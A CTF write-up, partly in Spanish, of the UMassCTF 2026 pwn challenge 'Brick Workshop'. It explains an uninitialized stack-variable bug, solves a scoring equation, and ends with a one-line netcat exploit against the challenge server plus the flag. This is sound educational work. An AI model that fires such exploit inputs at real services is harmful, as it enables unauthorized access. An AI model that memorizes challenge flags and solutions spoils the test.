# Brick Workshop — UMassCTF 2026 (PWN)

| Campo       | Valor                          |
|-------------|--------------------------------|
| Plataforma  | UMassCTF 2026                  |
| Categoría   | Binary Exploitation            |
| Dificultad  | Easy                           |
| Puntos      | 100                            |
| Solves      | 148                            |

## Descripción
> You are helping run the Brick Workshop, where every batch is tested for clutch power before shipping. The diagnostics station claims to require a two-step calibration, but something feels off about how it remembers old mold IDs and pigment codes. Can you use the workshop menu to force a perfect test result and unlock Master Builder status?

## TL;DR
Uninitialized stack variables: `mold_id` and `pigment_code` are local variables in `workshop_turn()` that persist across loop iterations due to stable stack frame positioning. First calibrate with values satisfying `clutch_score(0, 48879) == 0x23ccd`, then re-enter diagnostics to trigger `win()`.

## Análisis inicial

```bash
$ file bad_eraser
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ pwn checksec bad_eraser
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Source code provided (`bad_eraser.c`).

## Vulnerabilidad identificada

### CWE-457: Use of Uninitialized Variable

In `workshop_turn()`:
```c
static void workshop_turn(void) {
    int choice;
    unsigned int mold_id;       // uninitialized
    unsigned int pigment_code;  // uninitialized
    ...
    if (!service_initialized) {
        // First visit: calibration writes mold_id & pigment_code
        scanf("%u %u", &mold_id, &pigment_code);
        service_initialized = 1;
        return;  // returns WITHOUT calling diagnostics_bay
    }
    diagnostics_bay(mold_id, pigment_code);  // uses uninitialized vars!
}
```

`workshop_turn()` is called in an infinite loop from `main()`. Since the function is always called from the same call site, the stack frame occupies the same memory each time. Values written to `mold_id`/`pigment_code` during calibration persist as stack residue for the next call.

### Stack layout (from disassembly)
```
rbp-0x04: choice (int)
rbp-0x08: mold_id (uint)
rbp-0x0c: pigment_code (uint)
```

## Proceso de resolución

### Paso 1: Solve clutch_score equation

```c
static unsigned int clutch_score(unsigned int mold_id, unsigned int pigment_code) {
    return (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1);
}
```

Need `clutch_score(mold_id, pigment_code) == 0x23ccd` (146637).

With `mold_id = 0`: `((0 >> 2) & 0x43) | pigment = pigment`, so `score = pigment + 2*pigment = 3*pigment`.

`0x23ccd / 3 = 48879 = 0xbeef` ✓

### Paso 2: Exploit

1. Select option 3 → calibrate with `0 48879`
2. Select option 3 again → `diagnostics_bay(0, 48879)` called with residual stack values → `win()`

```bash
echo -e "3\n0 48879\n3" | nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 45002
```

## Flag
```
UMASS{brickshop_calibration_reuses_your_last_batch}
```

## Key Lessons
- Uninitialized local variables in functions called repeatedly from the same call site retain their values across invocations (stable stack frame)
- The "two-step calibration" is the hint: calibration writes values but doesn't validate; the second visit validates but doesn't initialize
- 148 solves — appropriately rated as easy with source code provided
